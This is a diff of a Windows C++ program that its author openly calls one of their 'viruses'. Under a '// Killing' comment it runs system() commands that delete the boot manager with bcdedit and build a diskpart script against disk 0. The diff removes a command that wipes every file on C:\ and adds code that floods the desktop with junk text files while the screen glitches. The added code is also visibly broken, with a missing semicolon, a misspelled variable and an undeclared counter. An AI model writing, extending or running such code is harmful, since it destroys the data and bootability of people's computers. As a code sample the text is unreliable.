@@ -1,4 +1,6 @@
 #include <Windows.h>
+#include <fstream>
+#include "getpath.hpp"
 
 static ULONGLONG n, r;
 int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
@@ -37,6 +39,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
     int sw = GetSystemMetrics(0);
     int sh = GetSystemMetrics(0);
+	auto path = get_desktop_path();
 
     int msgboxID = MessageBox(
         NULL,
@@ -53,11 +56,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         CreateThread(0, 0, shader1, 0, 0, 0);
 
         // Killing
-        system("bootrec /fixmbr");
-        system("bootrec /fixboot");
-        system("bootrec /rebuildbcd");
-        system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f");
-        system("del /f /s /q C:\\*.*");
+        system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f")
 		system("echo select disk 0 > diskpart.txt");
 		system("echo select partition 1 >> diskpart.txt");
 		system("echo assign letter=S >> diskpart.txt");
@@ -83,6 +82,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             int h = GetSystemMetrics(1);
             BitBlt(hdc, rand() % 222, rand() % 222, w, h, hdc, rand() % 222, rand() % 222, NOTSRCERASE);
             ReleaseDC(0, hdc);
+		
+			// filespam code from another one of my viruses
+			ofstream filespam(path.string() + "\\urmom" + to_string(counter) + ".txt");
+			filespame << "HI";
+			counter++;
         }
         break;
 
@@ -96,3 +100,4 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 	return 0;
 }
+
